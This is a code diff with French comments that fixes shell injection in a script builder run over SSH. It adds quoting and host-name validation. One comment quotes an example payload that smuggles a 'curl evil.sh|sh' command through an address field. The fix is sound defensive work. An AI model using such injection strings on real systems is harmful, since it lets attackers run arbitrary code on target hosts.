@@ -16,9 +16,35 @@ function ensureDocker() {
   return `if ! command -v docker &>/dev/null; then curl -fsSL https://get.docker.com | sh; fi`;
 }
 
+// Échappement shell POSIX correct pour une valeur insérée entre guillemets
+// simples : ferme la citation, insère un guillemet simple littéral échappé,
+// rouvre la citation. -e 'WOODPECKER_HOST=http://${addr}' n'était PAS
+// sûr tel quel : une adresse contenant un guillemet simple (ex.
+// "x' && curl evil.sh|sh && echo '") permettait d'injecter des commandes
+// arbitraires dans le script exécuté sur l'hôte cible via SSH — trouvé en
+// auditant sshExecutor.js/serviceCatalog.js. shQuote() rend la citation
+// sûre quel que soit le contenu ; assertValidHost() ci-dessous refuse en
+// plus, en amont, toute adresse qui ne ressemble pas à un nom d'hôte/IP
+// (défense en profondeur : les deux protections sont indépendantes).
+function shQuote(value) {
+  return `'${String(value).replace(/'/g, `'\\''`)}'`;
+}
+
+// Nom d'hôte (RFC 1123) ou IPv4/IPv6 littérale — refuse tout caractère de
+// métasyntaxe shell (espace, quote, $, backtick, ;, |, &, etc.) avant même
+// que la valeur n'atteigne un script exécuté à distance.
+const HOST_PATTERN = /^[a-zA-Z0-9]([a-zA-Z0-9-]{0,62}(\.[a-zA-Z0-9]([a-zA-Z0-9-]{0,62}))*)?$|^[0-9a-fA-F:]+$/;
+export function assertValidHost(address) {
+  const value = String(address || '').trim();
+  if (!value || value.length > 253 || !HOST_PATTERN.test(value)) {
+    throw Object.assign(new Error(`Adresse d'hôte invalide : "${address}" (nom d'hôte ou IP attendu, sans espace ni caractère spécial)`), { status: 400 });
+  }
+  return value;
+}
+
 function dockerRun({ name, image, ports = [], envVars = [], volumes = [], extraArgs = '', command = '' }) {
   const portArgs = ports.map((p) => `-p ${p}`).join(' ');
-  const envArgs = envVars.map((e) => `-e '${e}'`).join(' ');
+  const envArgs = envVars.map((e) => `-e ${shQuote(e)}`).join(' ');
   const volumeArgs = volumes.map((v) => `-v ${v}`).join(' ');
   return `
 set -e
@@ -145,5 +171,10 @@ export function getServiceMeta(toolId) {
 export function buildServiceScript(toolId, ctx = {}) {
   const entry = SERVICE_CATALOG[toolId];
   if (!entry) throw Object.assign(new Error(`Installation automatique indisponible pour "${toolId}"`), { status: 409 });
-  return entry.buildScript(ctx);
+  // ctx.address vient de la requête (adresse de la machine cible) et se
+  // retrouve interpolée dans certains scripts (woodpecker, step-ca) : validée
+  // ici, une seule fois, avant d'atteindre le moindre buildScript — défense
+  // en profondeur en plus de shQuote() dans dockerRun.
+  const safeCtx = ctx.address !== undefined ? { ...ctx, address: assertValidHost(ctx.address) } : ctx;
+  return entry.buildScript(safeCtx);
 }
